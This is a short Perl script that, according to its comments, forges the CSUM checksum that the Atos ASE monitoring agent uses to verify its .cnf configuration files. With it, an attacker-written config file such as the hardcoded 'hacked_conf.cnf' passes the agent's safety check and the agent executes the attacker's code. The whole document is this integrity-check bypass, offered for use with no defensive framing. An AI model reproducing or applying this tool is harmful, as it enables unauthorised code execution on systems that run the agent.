#!/usr/bin/perl

## This code generates an accurate CSUM value for the ASE (All ## Seeing Eye) configuration files used by Atos. (www.atos.net)
## Simply generated a .cnf file that will be used by ASE (use  ## one of theirs as an example)and then run your .cnf through  ## this tool to generate the correct CSUM value which should 
## then be put into the .cnf file.  You should see a CSUM ########## line in their conf file
## already.  This is how they verify the files in the directory ## are safe to execute. 
## Using this, you can create your own .cnf files and generate ## the proper CSUM so their ASE agent 
## will execute your code. Use at own risk.
## Author: Littleshack
## Sean Greathouse (sean.greathouse@gmail.com)

$file_to_check = 'D:\Tools\ASE\hacked_conf.cnf';

($sum, $csum) = check_sum($file_to_check);

print "Sum is $sum, and csum is $csum\n";

  sub check_sum
{

  (my $file) = @_;
  my $csum = 0;
  my $sum = 0;
  my @t;
  my $i;
  my $c = 1;
  print "File is: $file\n";
  if(open(FD, "<$file")) {
    while (<FD>) {
      if($_ =~ /^CSUM /) {
        $csum = (split(/ /, $_))[1];
        print "csum is $csum\n";
        next;
      }
      @t = split(//, $_);
      print "At-T is @t\n";
      $i = 0;
      while($t[$i] ne "") {
        $sum = $sum + (ord($t[$i]) * $c);
        #print "Sum is $sum\n";
        $i++;
        $c++;
      }
      
#print DBG "CSUM: $sum $_";
      
    }
    close FD;
  }
  return($sum, $csum);
}